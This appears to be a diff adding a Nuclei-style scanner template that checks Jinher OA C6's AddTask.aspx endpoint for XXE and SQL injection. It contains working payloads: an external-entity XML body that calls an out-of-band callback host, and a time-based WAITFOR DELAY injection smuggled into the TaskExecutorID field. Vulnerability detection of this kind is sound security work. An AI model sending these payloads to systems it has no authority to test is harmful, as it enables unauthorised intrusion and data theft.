@@ -1,0 +1,66 @@
+id: jinher-oa-c6-AddTask-xxe-sqli
+info:
+  name: 金和OA AddTask.aspx XXE漏洞+SQL注入漏洞
+  author: leadlife
+  severity: critical
+  description: 金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 AddTask.aspx 接口处存在SQL注入漏洞，同时该接口还存在XXE漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+  reference: 
+    - https://mp.weixin.qq.com/s?__biz=MzE5MTM2MjA0NQ==&mid=2247483788&idx=1&sn=7fcf8a52e1414207492d82135715bf1e&chksm=9606e71ea1716e08584bd4e65a6a07894827b2444e5d085d7db59ed9c52ef972540f4df95baf&cur_album_id=4045056277938913283&scene=189#wechat_redirect
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    hunter-query: demo
+    tips:
+    repair:
+    version:
+  tags: oob,jinher,oa,c6,sqli,oob
+
+http:
+  - raw:
+      - |
+        POST /c6/Jhsoft.Web.dailytaskmanage/AddTask.aspx/ HTTP/1.1
+        Content-Type: application/xml
+        Host: {{Hostname}}
+        Content-Length: 134
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE root [
+        <!ENTITY % remote SYSTEM "http://{{interactsh-url}}">
+        %remote;]>
+        <root/>
+            
+    matchers:
+      - type: word
+        name: xxe
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
+
+  - raw:
+      - |
+        @timeout: 15s
+        POST /c6/Jhsoft.Web.dailytaskmanage/AddTask.aspx/ HTTP/1.1
+        Content-Type: application/xml
+        Host: {{Hostname}}
+        Content-Length: 229
+
+        <root>
+          <Page>
+            <PageName>TaskDetect</PageName>
+          </Page>
+          <StartTime>2023-01-01 00:00:00</StartTime>
+          <EndTime>2023-01-01 00:00:00</EndTime>
+          <TaskExecutorID>3');WAITFOR DELAY'0:0:5'-- </TaskExecutorID>
+        </root>
+      
+    matchers:
+      - type: dsl
+        name: sqli
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
